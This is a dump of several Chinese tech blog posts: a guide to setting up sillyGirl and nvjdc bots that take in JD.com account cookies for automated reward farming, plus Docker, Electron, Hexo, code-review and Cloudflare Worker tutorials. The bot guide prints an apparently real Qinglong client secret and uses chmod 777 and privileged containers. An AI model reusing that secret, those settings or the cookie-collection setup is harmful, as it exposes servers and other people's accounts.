\"github.com/cdle/sillyGirl/develop/jd_cookie\"//腾讯QQ_ \"github.com/cdle/sillyGirl/im/qq\"//Te Legram_ \"github.com/cdle/sillyGirl/im/tg\"//微信公众号_ \"github.com/cdle/sillyGirl/im/wxmp\") 不会的也可以直接将dev.go.demo重命名为dev.go 除此之外，还需要拉取一些库。执行如下操作： 12cd /etc/sillyGirl/develop ##cd到傻妞的扩展目录developgit clone https://ghproxy.com/https://github.com/ufuckee/jd_cookie.git ##拉扩展库 3. 新增配置文件并编译傻妞 新增sets.conf配置文件 12cd /etc/sillyGirltouch sets.conf 配置内容 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960# 傻妞机器人名set sillyGirl name 傻妞#傻妞http服务是否开启，默认false，开启改为trueset sillyGirl enable_http_server true# 傻妞http服务端口set sillyGirl port 8080# 傻妞消息撤回等待时间，单位秒set sillyGirl duration 5# 傻妞自动升级是否通知set sillyGirl update_notify false# 傻妞内置赞赏码set sillyGirl appreciate https://gitee.com/aiancandle/sillyGirl/raw/main/appreciate.jpg # 设置青龙openapi的client_id参数set qinglong client_id fy8UO_4jRraC# 设置青龙openapi的client_secret参数set qinglong client_secret sQqDqI5U1yS9-gyOUa1EAbXT# 青龙是否开启自动隐藏重复任务功能set qinglong autoCronHideDuplicate true# 设置青龙面板地址set qinglong host http://192.168.50.100:5700# 设置qq登录账号#set qq uin 10000 #这里建议注释，直接后台弹出二维码登陆# 设置qq登录密码#set qq password 123456789 #这里建议注释，直接后台弹出二维码登陆# 设置监听群聊号码，默认监听所有set qq groupCode ?# 设置是否自动同意好友请求set qq auto_friend false# 是否对自己发出的消息进行回复set qq onself true# 设置qq管理员set qq masters q1&amp;q2&amp;q3...# 设置接受通知的qq账号，默认管理员接受set qq notifier q1&amp;q2&amp;q3...# 设置qq设备信息(自动生成)#set qq device.json ? #这里建议注释，直接后台弹出二维码登陆# 设置qq登录令牌(自动生成)#set qq session.token ? #这里建议注释，直接后台弹出二维码登陆# 设置telegram机器人tokenset tg token ?# 设置telegram机器人代理set tg url ?# 设置telegram机器人管理员set tg masters t1&amp;t2&amp;t3...# 设置接受通知的telegram账号，默认管理员接受set tg notifier t1&amp;t2&amp;t3...# 设置微信公众平台app_idset wxmp app_id ?# 设置微信公众平台app_secretset wxmp app_secret ?# 设置微信公众平台tokenset wxmp token ?# 设置微信公众平台encoding_aes_keyset wxmp encoding_aes_key ?# 设置微信公众平台管理员set wxmp masters w1&amp;w2&amp;w3...# 设置公众号关注事件回复set wxmp subscribe_reply 感谢关注！# 设置公众号默认回复set wxmp default_reply 无法回复该消息 4. 编译傻妞并运行 123cd /etc/sillyGirl &amp;&amp; go buildchmod 777 sillyGirl./sillyGirl 5.等弹出二维码机器人QQ扫码绑定机器人 等到QQ登录完，按住ctrl再按c退出 6.设置后台静默运行 1nohup ./sillyGirl 1&gt;/dev/null 2&gt;&amp;1 &amp; #AMD64 然后愉快的玩耍吧！ 安装nvjdc（Nolan）1.安装 wget、unzip并跳过询问是否安装 1yum install wget unzip -y 2.创建一个目录放配置以及chromium 1mkdir nvjdc &amp;&amp; cd nvjdc 3.下载config.json 配置文件 并且修改自己的配置 不能缺少，链接失效，自己把群里的模版文件放上去。 国内国外请使用(推荐) 1wget https://gitee.com/youhunwl/script/raw/master/Config.json 4.进入nvjdc，创建chromium文件夹并进入 12cd /root/nvjdcmkdir -p .local-chromium/Linux-884014 &amp;&amp; cd .local-chromium/Linux-884014 &amp;&amp; rm -f chrome-linux.zip 5.下载 chromium 1wget https://mirrors.huaweicloud.com/chromium-browser-snapshots/Linux_x64/884014/chrome-linux.zip &amp;&amp; unzip chrome-linux.zip 6.删除刚刚下载的压缩包 1rm -f chrome-linux.zip 7.回到刚刚创建的目录 1cd /root/nvjdc 8.拉镜像 1sudo docker pull nolanhzy/nvjdc:1.1 9.启动镜像 1docker run --name nvjdc -p 5701:80 -d -v \"$(pwd)\"/Config.json:/app/Config/Config.json:ro \\-v \"$(pwd)\"/.local-chromium:/app/.local-chromium \\-it --privileged=true nolanhzy/nvjdc:1.1 name：nvjdc 可以自定义，但是后续命令也要修改 这里的 5701 也是准备工作开放的端口，你也可以自定义 10.编辑（重点） /root/nvjdc目录下的Config.json文件，里面文档按自己使用情况修改 1234567891011121314151617181920212223242526272829303132333435363738394041&#123; ///浏览器最多几个网页 \"MaxTab\": \"4\", //网站标题 \"Title\": \"游魂博客\", //回收时间分钟 不填默认3分钟 \"Closetime\": \"5\", //网站公告 \"Announcement\": \"为提高账户的安全性，请关闭京东免密支付。下载以下APP并登陆你的账号： 京东、京喜、京东金融、京东极速版。\", ///开启打印等待日志卡短信验证登陆 可开启 拿到日志群里回复 默认不要填写 \"Debug\": \"\", ///自动滑块次数5次 5次后手动滑块 可设置为0默认手动滑块 \"AutoCaptchaCount\": \"5\", ///XDD PLUS Url http://IP地址:端口/api/login/smslogin \"XDDurl\": \"\", ///xddToken \"XDDToken\": \"\", ///Push Plus官方网站：http\": //www.pushplus.plus 只有青龙模式有用 ///下方填写您的Token，微信扫码登录后一对一推送或一对多推送下面的token，只填\" \"PUSH_PLUS_TOKEN\", \"PUSH_PLUS_TOKEN\": \"\", //下方填写您的一对多推送的 \"群组编码\" ，（一对多推送下面-&gt;您的群组(如无则新建)-&gt;群组编码） \"PUSH_PLUS_USER\": \"\", ///青龙配置 注意对接XDD 对接芝士 设置为\"Config\":[] \"Config\": [ &#123; //序号必填从1 开始 \"QLkey\": 1, //服务器名称 \"QLName\": \"阿里云\", //青龙地址 \"QLurl\": \"\", //青龙2,9 OpenApi Client ID \"QL_CLIENTID\": \"\", //青龙2,9 OpenApi Client Secret \"QL_SECRET\": \"\", //CK最大数量 \"QL_CAPACITY\": 40, \"QRurl\": \"\" &#125; ]&#125; 11.重启 1docker restart nvjdc 12.查看日志（用处不大） 1docker logs -f nvjdc 出现 NETJDC started 即可 更新教程确保上面那些文件下载过一遍，更新不会删除上面已下载的文件。 1.删除容器 12docker ps #可以看运行中的镜像名字docker rm -f nvjdc #直接删除运行中的nvjdc 2.删除镜像 1234567docker images #可以看下载的镜像名字docker rmi -f nolanhzy/nvjdc:0.6docker rmi -f nolanhzy/nvjdc:0.8docker rmi -f nolanhzy/nvjdc:0.9docker rmi -f nolanhzy/nvjdc:0.958docker rmi -f nolanhzy/nvjdc:1.0docker rmi -f nolanhzy/nvjdc:1.1 3.回到安装时创建的目录内，然后重新执行安装教程 8、9 12# 比如原来在 root 下 nvjdc 文件夹中cd /root/nvjdc 对接xdd-plus1.修改nvjdc的配置文件 12345678910&#123; ... ///XDD PLUS Url http://IP地址:端口/api/login/smslogin \"XDDurl\": \"\", ///xddToken \"XDDToken\": \"\", ... ///青龙配置 注意对接XDD 对接芝士 设置为\"Config\":[] \"Config\": []&#125; XDDurl：xdd-plus的地址 例：http://123.123.123.123:8080/api/login/smslogin XDDToken：xdd-plus配置文件中设置的 master 后台密码 Config：这里的Config必须为空！ 2.编辑好后保存重启容器 1docker restart nvjdc 到这一步已经可以全部正常使用了，看看效果 对接傻妞1.首先对接过阿东的发下面命令给傻妞机器人删除阿东对接 1delete jd_cookie adong_addr 2.设置若兰（nvjdc） 给傻妞机器人发命令 123set jd_cookie nolan_addr http://若兰IP:端口# 例：set jd_cookie nolan_addr http://192.168.1.1:5703# 需要http://前缀！！！ 需要http://前缀！！！ 需要http://前缀！！！ 重要事情说三遍！！！ 3.修改配置文件 1234567891011121314151617181920&#123; ///浏览器最多几个网页 \"MaxTab\": \"4\", //网站标题 \"Title\": \"游魂博客\", //回收时间分钟 不填默认3分钟 \"Closetime\": \"3\", //网站公告 \"Announcement\": \"做人，最重要的就是开心啦。\", ///开启打印等待日志卡短信验证登陆 可开启 拿到日志群里回复 默认不要填写 \"Debug\": \"\", ///自动滑块次数5次 5次后手动滑块 可设置为0默认手动滑块 \"AutoCaptchaCount\": \"5\", ///XDD PLUS Url http://IP地址:端口/api/login/smslogin \"XDDurl\": \"\", ///xddToken \"XDDToken\": \"\", ///青龙配置 注意对接XDD 对接芝士 设置为\"Config\":[] \"Config\": []&#125; 4.重启容器 1sudo docker restart nvjdc 青龙面板ck过多执行任务报 Argument list too long错误解决方案青龙面板内部互助最新设置教程【合集】 各大JD脚本库合集（最全收藏版）-适用青龙2.10.3及以上 微信交流群：添加微信iyouhun 发送指令羊毛群自动邀请Q Q 交流群：点我加Q群：56359657","categories":[{"name":"资源","slug":"资源","permalink":"//www.shen.ee/categories/资源/"}],"tags":[{"name":"青龙","slug":"青龙","permalink":"//www.shen.ee/tags/青龙/"},{"name":"青龙面板","slug":"青龙面板","permalink":"//www.shen.ee/tags/青龙面板/"},{"name":"青龙面板搭建","slug":"青龙面板搭建","permalink":"//www.shen.ee/tags/青龙面板搭建/"},{"name":"青龙面板安装","slug":"青龙面板安装","permalink":"//www.shen.ee/tags/青龙面板安装/"},{"name":"京东代挂","slug":"京东代挂","permalink":"//www.shen.ee/tags/京东代挂/"},{"name":"京东免费代挂","slug":"京东免费代挂","permalink":"//www.shen.ee/tags/京东免费代挂/"},{"name":"机器人","slug":"机器人","permalink":"//www.shen.ee/tags/机器人/"},{"name":"京东代挂机器人","slug":"京东代挂机器人","permalink":"//www.shen.ee/tags/京东代挂机器人/"},{"name":"xdd-plus","slug":"xdd-plus","permalink":"//www.shen.ee/tags/xdd-plus/"},{"name":"傻妞sillyGirl","slug":"傻妞sillyGirl","permalink":"//www.shen.ee/tags/傻妞sillyGirl/"},{"name":"傻妞机器人","slug":"傻妞机器人","permalink":"//www.shen.ee/tags/傻妞机器人/"},{"name":"nvjdc","slug":"nvjdc","permalink":"//www.shen.ee/tags/nvjdc/"},{"name":"Nolan","slug":"Nolan","permalink":"//www.shen.ee/tags/Nolan/"},{"name":"京东短信登录","slug":"京东短信登录","permalink":"//www.shen.ee/tags/京东短信登录/"}],"keywords":[{"name":"资源","slug":"资源","permalink":"//www.shen.ee/categories/资源/"}]},{"title":"Docker常用命令|备忘单","slug":"Docker常用命令|备忘单","date":"2021-11-22T07:47:49.000Z","updated":"2022-06-22T06:24:25.990Z","comments":true,"path":"article/44434.html","link":"","permalink":"//www.shen.ee/article/44434.html","excerpt":"","text":"Docker 是一个用于开发、传送和运行应用程序的开放平台。Docker 使您能够将应用程序与基础设施分开，以便您可以快速交付软件。使用 Docker，您可以像管理应用程序一样管理基础设施。通过利用 Docker 的快速交付、测试和部署代码的方法，您可以显着减少编写代码和在生产中运行代码之间的延迟。在这篇文章中，我将提到我们需要或大多数用例的 docker 命令。 生命周期命令创建一个容器（不启动它） 1234docker create [OPTIONS] IMAGE [COMMAND] [ARG...]# 使用docker镜像nginx:latest创建一个容器,并将容器命名为mynginx# docker create --name mynginx nginx:latest 创建一个新的容器并运行一个命令 1234docker run [OPTIONS] IMAGE [COMMAND] [ARG...]# 使用docker镜像nginx:latest以后台模式启动一个容器,并将容器命名为mynginx# docker run --name mynginx -d nginx:latest OPTIONS说明: -a stdin: 指定标准输入输出内容类型，可选 STDIN/STDOUT/STDERR 三项； -d: 后台运行容器，并返回容器ID； -i: 以交互模式运行容器，通常与 -t 同时使用； -P: 随机端口映射，容器内部端口随机映射到主机的端口 -p: 指定端口映射，格式为：主机(宿主)端口:容器端口 -t: 为容器重新分配一个伪输入终端，通常与 -i 同时使用； –name=”nginx-lb”: 为容器指定一个名称； –dns 8.8.8.8: 指定容器使用的DNS服务器，默认和宿主一致； –dns-search example.com: 指定容器DNS搜索域名，默认和宿主一致； -h “mars”: 指定容器的hostname； -e username=”ritchie”: 设置环境变量； –env-file=[]: 从指定文件读入环境变量； –cpuset=”0-2” or –cpuset=”0,1,2”: 绑定容器到指定CPU运行； -m :设置容器使用内存最大值； –net=”bridge”: 指定容器的网络连接类型，支持 bridge/host/none/container: 四种类型； –link=[]: 添加链接到另一个容器； –expose=[]: 开放一个端口或一组端口； –volume , -v: 绑定一个卷 重命名现有容器 1docker rename [CONTAINER_NAME] [NEW_CONTAINER_NAME] 在新容器中运行命令 1docker run [IMAGE] [COMMAND] 退出后移除容器 1docker run --rm [IMAGE] 启动一个容器并保持运行 1docker run -td [IMAGE] 启动一个容器并在容器中创建一个交互式 bash shell 1docker run -it [IMAGE] 在容器内创建、启动和运行命令，并在执行命令后移除容器。 1docker run -it-rm [IMAGE] 在已经运行的容器内执行命令。 1docker exec -it [container] 删除一个容器（如果它没有运行） 1docker rm [CONTAINER] 更新容器的配置 1docker update [CONTAINER] 启动和停止容器启动容器 1docker start [CONTAINER] 停止运行容器 1docker stop [CONTAINER] 停止运行容器并重新启动它 1docker restart [CONTAINER] 暂停正在运行的容器中的进程 1docker pause [CONTAINER] 取消暂停正在运行的容器中的进程 1docker unpause [CONTAINER] 阻塞一个容器直到其他容器停止 1docker wait [CONTAINER] 通过向正在运行的容器发送 SIGKILL 来杀死容器 1docker kill [CONTAINER] 将本地标准输入、输出和错误流附加到正在运行的容器 1docker attach [CONTAINER] Docker 镜像命令从 Dockerfile 创建镜像 1docker build [URL/FILE] 从带有标签的 Dockerfile 创建镜像 1docker build -t &lt;tag&gt; [URL/FILE] 从注册表中心拉取镜像 1docker pull [IMAGE] 将镜像推送到注册中心 1docker push [IMAGE] 从 tarball 创建镜像 1docker import [URL/FILE] 从容器创建镜像 1docker commit [CONTAINER] [NEW_IMAGE_NAME] 删除镜像 1docker rmi [IMAGE] 从 tar 存档或标准输入加载镜像 1docker load [TAR_FILE/STDIN_FILE] 将镜像保存到 tar 存档 1docker save [IMAGE] &gt; [TAR_FILE] Docker 容器和镜像信息列出正在运行的容器 1docker ps 列出正在运行的容器和已停止的容器 1docker ps -a 列出正在运行的容器中的日志 1docker logs [CONTAINER] 列出 Docker 对象的低级信息 1docker inspect [OBJECT_NAME/ID] 列出来自容器的实时事件 1docker events [CONTAINER] 显示容器的端口映射 1docker port [CONTAINER] 显示容器中正在运行的进程 1docker top [CONTAINER] 显示容器的实时资源使用统计 1docker stats [CONTAINER] 显示文件系统上文件（或目录）的更改 1docker diff [CONTAINER] 列出本地使用 docker 引擎存储的所有镜像 1docker [image] ls 显示镜像的历史 1docker history [IMAGE] 网络命令列出网络 1docker network ls 删除一个或多个网络 1docker network rm [NETWORK] 显示一个或多个网络的信息 1docker network inspect [NETWORK] 将容器连接到网络 1docker network connect [NETWORK] [CONTAINER] 断开容器与网络的连接 1docker network disconnect [NETWORK] [CONTAINER] 容器rootfs命令从容器里面拷文件到宿主机 12# docker cp 容器名：要拷贝的文件在容器里面的路径 要拷贝到宿主机的相应路径 docker cp testtomcat:/usr/local/tomcat/webapps/test/js/test.js /root 从宿主机拷文件到容器里面 12# docker cp 要拷贝的文件路径 容器名:要拷贝到容器里面对应的路径docker cp /root/test.js testtomcat:/usr/local/tomcat/webapps/test/js","categories":[{"name":"后端","slug":"后端","permalink":"//www.shen.ee/categories/后端/"}],"tags":[{"name":"Docker","slug":"Docker","permalink":"//www.shen.ee/tags/Docker/"},{"name":"Docker命令","slug":"Docker命令","permalink":"//www.shen.ee/tags/Docker命令/"},{"name":"Docker常用命令","slug":"Docker常用命令","permalink":"//www.shen.ee/tags/Docker常用命令/"},{"name":"Docker入门","slug":"Docker入门","permalink":"//www.shen.ee/tags/Docker入门/"},{"name":"Docker快速上手","slug":"Docker快速上手","permalink":"//www.shen.ee/tags/Docker快速上手/"},{"name":"Docker创建容器","slug":"Docker创建容器","permalink":"//www.shen.ee/tags/Docker创建容器/"},{"name":"Docker复制文件","slug":"Docker复制文件","permalink":"//www.shen.ee/tags/Docker复制文件/"}],"keywords":[{"name":"后端","slug":"后端","permalink":"//www.shen.ee/categories/后端/"}]},{"title":"Electron快速上手并将网站直接生成桌面应用","slug":"Electron快速上手并将网站直接生成桌面应用","date":"2021-11-20T02:31:42.000Z","updated":"2021-11-22T07:51:49.540Z","comments":true,"path":"article/9481.html","link":"","permalink":"//www.shen.ee/article/9481.html","excerpt":"","text":"介绍 使用 JavaScript，HTML 和 CSS 构建跨平台的桌面应用程序 基于 Chromium 和 Node.js 让你可以使用 HTML, CSS 和 JavaScript 构建应用 开源 跨平台（Windows、Mac、Linux） Atom、Postman、Notion、Vscode等都是用Electron开发的 快速上手手动1.创建文件并初始化 12mkdir Hello-world &amp;&amp; cd Hello-worldnpm init -y 记得修改入口文件，并在根目录创建入口文件 main.js 123456// package.json&#123; ... \"main\": \"main.js\", ...&#125; 2.安装electron依赖 1npm install --save-dev electron 3.在package.json配置文件中的scripts字段下增加一条start命令 123456// package.json&#123; \"scripts\": &#123; \"start\": \"electron .\" &#125;&#125; 4.运行 1npm start 5.空白是因为并没有任何内容，写个 HTML 123456789101112&lt;!-- index.html --&gt;&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;Hello World!&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;h1&gt;Hello World!&lt;/h1&gt; &lt;p&gt;Welcome to your Electron application.&lt;/p&gt; &lt;/body&gt;&lt;/html&gt; 6.修改主入口main.js代码 12345678910111213141516171819202122232425262728293031323334353637// 在文件头部引入 Node.js 中的 path 模块const path = require('path')// app：控制应用程序事件生命周期的模块// BrowserWindow：创建和管理应用程序窗口模块const &#123; app, BrowserWindow &#125; = require('electron')function createWindow () &#123; const mainWindow = new BrowserWindow(&#123; width: 800, height: 600, webPreferences: &#123; preload: path.join(__dirname, 'preload.js') &#125; &#125;) mainWindow.loadFile('index.html') // 打开开发工具 mainWindow.webContents.openDevTools()&#125;// 在 Electron 中，只有在 app 模块的 ready 事件被激发后才能创建浏览器窗口// 类似vue 的生命周期 将会在 Electron 结束后初始化app.whenReady().then(() =&gt; &#123; createWindow()// Mac 逻辑 关闭只是隐藏 command + Q 才完全退出 app.on('activate', function () &#123; if (BrowserWindow.getAllWindows().length === 0) createWindow() &#125;)&#125;)// Windows 和 linux 关闭窗口会完全退出窗口app.on('window-all-closed', function () &#123; if (process.platform !== 'darwin') app.quit()&#125;) 脚手架12345678# 克隆示例项目的仓库git clone https://github.com/electron/electron-quick-start# 进入这个仓库cd electron-quick-start# 安装依赖并运行npm install &amp;&amp; npm start 如果安装过慢可以设置淘宝源 最新淘宝源地址： 123456# Npm 设置淘宝源npm config set registry https://registry.npmmirror.com/# 检查是否修改成功npm config get registry 使用淘宝源运行时如果提示这个错误 地址问题 1throw new Error('Electron failed to install correctly, please delete node_modules/electron and try installing again') 则设置electron 镜像源地址 1npm config set electron_mirror https://cdn.npm.taobao.org/dist/electron/ 打包 注意：图标格式 Windows 下使用的 icon.ico Mac 使用的是 icon.icns 使用electron-forge 安装 12npm install --save-dev @electron-forge/clinpx electron-forge import 使用 1npm run make 打包参数配置 package.json文件里的config =&gt; forge =&gt; packagerConfig 使用electron-packager 安装 1npm install --save-dev electron-packager 使用 1npx electron-packager &lt;sourcedir&gt; &lt;appname&gt; --platform=&lt;platform&gt; --arch=&lt;arch&gt; [optional flags...] 具体参数：https://github.com/electron/electron-packager 将网站直接生成桌面应用用上面手动或者脚手架的方式创建初始化文件 修改 main.js 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960const &#123; app, BrowserWindow, Menu &#125; = require('electron')function createWindow() &#123; const win = new BrowserWindow(&#123; autoHideMenuBar: true, show: false, // 是否显示窗口,否后,通过对象.show()打开 fullscreen: false, &#125;) /** * 优化加载方式 当页面在窗口中直接加载时，用户会看到未完成的页面， * 这不是一个好的原生应用的体验,使用此事件后显示窗口将没有视觉闪烁 */ win.on('ready-to-show', () =&gt; &#123; win.show() &#125;) //生成调试工具栏 // win.webContents.openDevTools() // 窗口最大化 win.maximize() // 加载远程URL(网址) win.loadURL('https://www.iyouhun.com/') // 设置菜单栏 const template = [ &#123; label: '文件', submenu: [ &#123; label: '关于', role: 'about', &#125;, &#123; label: '关闭', accelerator: 'Command+Q', click: () =&gt; &#123; win.close() &#125;, &#125;, ], &#125;, ] const menu = Menu.buildFromTemplate(template) Menu.setApplicationMenu(menu)&#125;app.on('ready', createWindow)// Windows 和 linux 关闭窗口会完全退出窗口app.on('window-all-closed', () =&gt; &#123; if (process.platform !== 'darwin') &#123; app.quit() &#125;&#125;)app.on('activate', () =&gt; &#123; // Mac 逻辑 if (BrowserWindow.getAllWindows().length === 0) &#123; createWindow() &#125;&#125;) Electron的优缺点优点 原生的接口（菜单、消息提醒、系统托盘等）。 上手难度低，能够使用react、vue等前端框架，能方便地迁移前端组件，构建出漂亮的桌面应用。 方便热更新 调试和测试方便 Electron使用node.js。因此，您可以导入Chrome应用程序中不容易使用的许多模块 Electron文档要好得多 缺点 不适合开发轻量级的应用。即使一个electron的项目框架，也包含chromium内核。 相比c++开发的桌面应用，性能远远不如后者。 启动速度慢。 每个窗口都是一个新的进程，占据大量内存。 Electron和 PWA 可用性 Electron 不能安装在任何设备 PWA 只要有网有浏览器记性，甚至不需要网络 性能 PWA具有更好性能，使用 Service Worker，减少加载时间 占用空间 Electron包过大，毕竟每个包都包含了包含chromium内核 安全性 Electron包不加任何混淆加密的话是完全可读的，因为存放在本地 PWA存放在服务端且只能通过HTTPS传输 更新和集成 两者都可以做到服务端异步更新 交互 Electron可以调用原生的接口 Electron和Flutter 上手难度 Electron：会基础的HTML、CSS、JS即可 Flutter：需学习Dart语言 侧重点 Electron更偏向PC端应用 Flutter更偏向移动端应用","categories":[{"name":"前端","slug":"前端","permalink":"//www.shen.ee/categories/前端/"}],"tags":[{"name":"Electron","slug":"Electron","permalink":"//www.shen.ee/tags/Electron/"},{"name":"Electron入门","slug":"Electron入门","permalink":"//www.shen.ee/tags/Electron入门/"},{"name":"Electron快速上手","slug":"Electron快速上手","permalink":"//www.shen.ee/tags/Electron快速上手/"},{"name":"将网站直接生成桌面应用","slug":"将网站直接生成桌面应用","permalink":"//www.shen.ee/tags/将网站直接生成桌面应用/"},{"name":"Flutter","slug":"Flutter","permalink":"//www.shen.ee/tags/Flutter/"},{"name":"PWA","slug":"PWA","permalink":"//www.shen.ee/tags/PWA/"}],"keywords":[{"name":"前端","slug":"前端","permalink":"//www.shen.ee/categories/前端/"}]},{"title":"Hexo博客升级随笔","slug":"Hexo 博客升级随笔","date":"2021-11-16T09:50:03.000Z","updated":"2021-11-23T08:13:34.075Z","comments":true,"path":"article/28951.html","link":"","permalink":"//www.shen.ee/article/28951.html","excerpt":"","text":"最近 hexo 博客升级，把遇到的问题做个备份。 由于长时间没同步该博客文章，Jenkins 打包的时候提示 1ReferenceError: primordials is not defined 虽然可以发布成功并 push 到远程仓库，但是所有生成的文件内容为空 原因：node 版本过高，gulp 版本过低导致不兼容 解决方式一： 尝试降级node 版本解决 降到 v12之前 解决方式二： 网上找到的，但我用了没解决 使用npm shrinkwrap锁定依赖版本 项目根目录新建npm-shrinkwrap.json npm-shrinkwrap.json内容修改如下： 1234567&#123; \"dependencies\": &#123; \"graceful-fs\": &#123; \"version\": \"4.2.2\" &#125; &#125;&#125; 解决方式三： 前端肯定要探索前沿技术，用新不用旧。那只能升级 gulp 了 1npm install --save-dev gulp@4.0.0 但是升级后的 gulp 语法有改动，所以需要修改 gulpfile.js文件,否则会报 1TypeError: gulp.on(…).on(…).on(…).on(…).start is not a function gulp.series 用于串行（顺序）执行 gulp.parallel 用于并行执行 上面的两个函数接受两个参数： 要执行的任务的名字 需要执行的函数 123456789101112131415gulp.task('task1', gulp.series('task1-1', function (done) &#123; // task 1 code here done();&#125;)); gulp.task('task2', gulp.series('task2-1', function (done) &#123; // task 2 code here done();&#125;)); // Similarly Tasks 3 and 4 Code here gulp.task('main', gulp.series('task1', 'task2', 'task3', 'task4', function (done) &#123; done();&#125;)); 进入官方文档查看，官方的意思是，4.0.0版本的，“default”右边两个参数放在gulp.series()的参数中，否则会报错 12345678// 我的部分 gulp 代码// 执行taskgulp.task('deploy',gulp.series('minify-css','minify-js',gulp.parallel('rev','minify-html')));// 部署前代码处理gulp.task('default',gulp.series(['deploy'],function(e)&#123; console.log(\"[complete] please execute： hexo d\");&#125;)) gulp报错gulpInst.start.apply(gulpInst, toRun) 一般是因为gulp cli和gulp版本不兼容或者没有安装gulp cli导致的 进行全局安装 1npm i -g gulp-cli 执行后，报错提示已经存在 此时就需要删除已经安装的版本，重新进行安装 123sudo rm /usr/local/bin/gulpsudo rm /usr/local/share/man/man1/gulp.1npm i -g gulp-cli 然后执行gulp，可以成功运行。","categories":[{"name":"前端","slug":"前端","permalink":"//www.shen.ee/categories/前端/"}],"tags":[{"name":"Gulp","slug":"Gulp","permalink":"//www.shen.ee/tags/Gulp/"},{"name":"Node","slug":"Node","permalink":"//www.shen.ee/tags/Node/"},{"name":"Hexo","slug":"Hexo","permalink":"//www.shen.ee/tags/Hexo/"},{"name":"Hexo升级","slug":"Hexo升级","permalink":"//www.shen.ee/tags/Hexo升级/"},{"name":"jenkins","slug":"jenkins","permalink":"//www.shen.ee/tags/jenkins/"}],"keywords":[{"name":"前端","slug":"前端","permalink":"//www.shen.ee/categories/前端/"}]},{"title":"前端代码审查清单","slug":"前端审查清单","date":"2020-07-10T14:56:11.000Z","updated":"2021-11-15T07:55:36.544Z","comments":true,"path":"article/23761.html","link":"","permalink":"//www.shen.ee/article/23761.html","excerpt":"","text":"是什么？为什么？前端代码审查清单是一个保证前端代码质量的审查清单。当我们在开发写代码的时候，总会各种各样的问题，自测的时候由于太熟悉自己的代码逻辑往往测试不够充分，无法发现问题。 前端代码审查清单就是为了解决这个问题！清单存放了一些常见的问题，当我们开发完成之后，对照清单思考一下这些问题在代码中是否遇到或者妥善处理，从而提高代码质量。 前端前端安全 所有的用户可以在页面中输入信息的地方，是否做了防 XSS 以及特殊字符的过滤处理？ 与后端接口交互，获取信息使用 GET 方式，传送信息使用 POST 方式。后端接口应对各项参数做校验。前端也要判断接口是否返回合法、正确。 开发与 DOM 操作有关的代码时，是否对 DOM 不存在或者被人为修改的情况做处理？ 获取数据和信息时，是否对类型做过处理和转换并设置为空时的默认值？比如：var num = parseInt(Str); 在所有会发生错误的地方，是否编写了错误处理逻辑？比如：阻止继续执行、显示错误信息、记录错误日志和信息等。 代码里获取 window.location 相关属性的地方，是否对里面的 XSS 字符做了过滤处理？ 前端性能 JS 代码是否尽量放在底部？CSS 代码是否尽量放在了顶部？ 是否部署 CDN 或者开启了缓存功能？ 上线或者发布前，是否对静态资源进行打包、压缩处理？ 正确使用预加载、懒加载等技术手段提高性能。 是否对图片等资源进行压缩以及 CSS Sprite 处理？ 代码质量 你的代码是否遵循团队要求的代码规范？ 是否有冗余代码没有注释掉或者删掉？例如：删除或者注释 console.log 避免低端 IE 报错等。 关键功能是否还有优化的空间？ 代码是否简单易懂，逻辑清晰，模块化？ 变量名是否简单易懂？是否拼写正确？ CSS 属性是否有拼写错误？ HTML 标签是否书写正确，是否嵌套正确？ JS 代码是否经过 JSLint 或者 ESLint 等工具校验？ 是否将核心功能尽可能独立，从而避免其他功能出现问题影响到核心功能？ 注释 是否在重要功能附近添加合适的注释？ 注释是否包含了开发人员信息、开发时间、开发者联系方式以及相关功能说明？ 换位思考，你能根据你的注释推断出下面代码的功能吗？ 代码里是否还存在 TODO ？是否可以删掉或者完善功能？ 可能产生意外情况的地方是否留下说明？ 测试 代码逻辑是否正确、可用、符合需求？ 在进行各种操作的时候，是否有报错出现？ 是否有资源加载出错或者失败？ 是否按照项目要求，使用相关设备以及浏览器进行测试和体验？ 是否对边界条件以及看起来比较极端的情况做过测试？ 故障处理 是否考虑过如果发生线上故障，如何做回滚处理？处理什么文件？ 功能与功能之间是否足够独立？是否设置开关？当某个功能发生故障是否可以通过开关关掉？ 贡献由于本人才疏学浅，部分场景没有覆盖，欢迎大家补充更多审查点，提高前端代码质量！","categories":[{"name":"前端","slug":"前端","permalink":"//www.shen.ee/categories/前端/"}],"tags":[{"name":"前端","slug":"前端","permalink":"//www.shen.ee/tags/前端/"},{"name":"前端代码审查","slug":"前端代码审查","permalink":"//www.shen.ee/tags/前端代码审查/"},{"name":"代码审查","slug":"代码审查","permalink":"//www.shen.ee/tags/代码审查/"},{"name":"code-checklist","slug":"code-checklist","permalink":"//www.shen.ee/tags/code-checklist/"}],"keywords":[{"name":"前端","slug":"前端","permalink":"//www.shen.ee/categories/前端/"}]},{"title":"使用CloudFlare Worker 免费部署 JSProxy 服务","slug":"使用CloudFlare Worker 免费部署 JSProxy 服务","date":"2020-03-27T07:56:56.000Z","updated":"2021-11-15T07:55:36.542Z","comments":true,"path":"article/29845.html","link":"","permalink":"//www.shen.ee/article/29845.html","excerpt":"","text":"本教程仅仅用于学习交流使用 Cloudflare Workers官方介绍： 在边缘运行代码，提供强大的 Web 可扩展性 在边缘应用自定义安全规则和过滤逻辑来检测恶意 Bots 病毒并防止它们消耗资源，从而提高安全性。 将更多个性化和交互性纳入静态 HTML 页面，并在边缘运行动态请求，从而改善用户体验。 将更多操作流程和请求处理转移到边缘，以提高缓存命中率并降低带宽成本，从而降低运营成本。 简单的说就是你不用服务器就可以运行你的代码. 不必担心服务器成本，僵尸流量攻击或部署服务器资源与架构，您可以直接编写代码，开发程序服务。 可以使用的工具： 运行任何JavaScript代码，使用最新的标准语言特性； 拦截并修改HTTP请求，响应URL、状态、头信息和正文； 直接从Worker响应请求，或者转发到其他地方； 把HTTP请求发送给第三方服务器； 串行或并行发送多个请求，把这些请求的响应组合成原始请求的最终响应； 在响应返回给客户端以后发送异步请求（例如，记录日志或分析）； 控制其他Cloudflare特性，比如缓存行为。 等… 免费版支持每天10 万次免费请求，日常使用基本够了。 使用教程 ​ 没有 Cloudflare 账号的提前注册一个 打开 https://workers.cloudflare.com ，登录上你的 Cloudflare 账号激活 Workers 服务 然后点击 Create a Worker 创建一个，具体说明看图 在 script 左侧代码区，编写完毕后，点击Save and Deploy 